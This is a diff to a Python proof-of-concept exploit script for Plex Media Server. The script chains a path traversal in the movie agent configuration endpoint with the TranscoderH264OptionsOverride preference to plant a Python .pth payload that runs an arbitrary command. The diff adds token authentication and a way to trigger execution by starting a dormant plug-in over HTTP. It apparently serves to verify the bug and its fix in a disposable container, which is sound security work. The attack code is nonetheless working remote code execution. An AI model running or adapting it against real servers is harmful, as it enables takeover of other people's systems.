@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import pathlib
+import re
 import subprocess
 import sys
 import time
@@ -66,8 +67,8 @@ def docker_remove_generated(container, pth_path):
         )
 
 
-def read_preference(origin):
-    status, body = request(f"{origin}/:/prefs")
+def read_preference(origin, headers=None):
+    status, body = request(f"{origin}/:/prefs", headers=headers)
     if status != 200:
         raise RuntimeError(f"preference read returned HTTP {status}")
     root = ET.fromstring(body)
@@ -86,6 +87,11 @@ def main():
     parser.add_argument("--command", required=True)
     parser.add_argument("--container", required=True, help="Disposable Docker container")
     parser.add_argument("--verify-path", required=True)
+    parser.add_argument("--token", help="Plex authentication token")
+    parser.add_argument(
+        "--trigger-plugin",
+        help="start this dormant Framework plug-in over HTTP instead of restarting the container",
+    )
     parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
     parser.add_argument("--keep-payload", action="store_true")
     args = parser.parse_args()
@@ -99,6 +105,8 @@ def main():
         parser.error("--rating-key must be greater than zero")
     if not args.verify_path.startswith("/"):
         parser.error("--verify-path must be an absolute container path")
+    if args.trigger_plugin and not re.fullmatch(r"[A-Za-z0-9._-]+", args.trigger_plugin):
+        parser.error("--trigger-plugin contains an invalid character")
     if docker_exists(args.container, args.verify_path):
         raise RuntimeError(f"verification path already exists: {args.verify_path}")
 
@@ -110,6 +118,7 @@ def main():
         "0,0,q=20,stats=x\n"
         f"import os;os.system('{command_hex}'.decode('hex'))"
     )
+    auth_headers = {"X-Plex-Token": args.token} if args.token else {}
 
     directory_existed = docker_exists(args.container, PTH_DIRECTORY)
     if args.expect == "vulnerable" and directory_existed:
@@ -121,23 +130,26 @@ def main():
         f"{origin}/system/agents/tv.plex.agents.movie/config/1",
         method="PUT",
         params={"identifier": TRAVERSAL, "order": "com.plexapp.agents.localmedia"},
+        headers=auth_headers,
     )
     print(f"Configuration status: {config_status}")
     if args.expect == "vulnerable":
         if config_status != 200 or not docker_exists(args.container, PTH_DIRECTORY):
             raise RuntimeError("Framework request did not create the Python site directory")
 
-    original_preference = read_preference(origin)
+    original_preference = read_preference(origin, auth_headers)
     print("[2/4] Set TranscoderH264OptionsOverride")
     pref_status, _ = request(
         f"{origin}/:/prefs",
         method="PUT",
         params={"TranscoderH264OptionsOverride": payload},
+        headers=auth_headers,
     )
     print(f"Preference status: {pref_status}")
 
     if args.expect == "fixed":
-        if (pref_status != 403 or read_preference(origin) != original_preference or
+        if (pref_status != 403 or
+                read_preference(origin, auth_headers) != original_preference or
                 docker_exists(args.container, pth_path)):
             raise RuntimeError("fixed behavior was not observed")
         print("PASS: fixed build rejected the protected preference")
@@ -154,6 +166,7 @@ def main():
         "X-Plex-Platform": "Chrome",
         "X-Plex-Device": "Linux",
     }
+    headers.update(auth_headers)
     transcode = {
         "path": f"/library/metadata/{args.rating_key}",
         "mediaIndex": 0,
@@ -193,18 +206,28 @@ def main():
             f"{origin}/:/prefs",
             method="PUT",
             params={"TranscoderH264OptionsOverride": original_preference},
+            headers=auth_headers,
         )
-        if reset_status != 200 or read_preference(origin) != original_preference:
+        if (reset_status != 200 or
+                read_preference(origin, auth_headers) != original_preference):
             raise RuntimeError(
                 f"payload was placed but preference reset returned HTTP {reset_status}"
             )
         preference_reset = True
-        print("[4/4] Restart container and verify command execution")
-        subprocess.run(
-            ["docker", "restart", args.container],
-            check=True,
-            stdout=subprocess.DEVNULL,
-        )
+        if args.trigger_plugin:
+            print("[4/4] Start dormant Script Host over HTTP and verify command execution")
+            trigger_status, _ = request(
+                f"{origin}/:/plugins/{args.trigger_plugin}",
+                headers=auth_headers,
+            )
+            print(f"Script Host trigger status: {trigger_status}")
+        else:
+            print("[4/4] Restart container and verify command execution")
+            subprocess.run(
+                ["docker", "restart", args.container],
+                check=True,
+                stdout=subprocess.DEVNULL,
+            )
         for _ in range(120):
             if docker_exists(args.container, args.verify_path):
                 break
@@ -218,10 +241,11 @@ def main():
                     f"{origin}/:/prefs",
                     method="PUT",
                     params={"TranscoderH264OptionsOverride": original_preference},
+                    headers=auth_headers,
                     timeout=3,
                 )
                 if (retry_status != 200 or
-                        read_preference(origin) != original_preference):
+                        read_preference(origin, auth_headers) != original_preference):
                     print(
                         f"warning: preference reset returned HTTP {retry_status}",
                         file=sys.stderr,
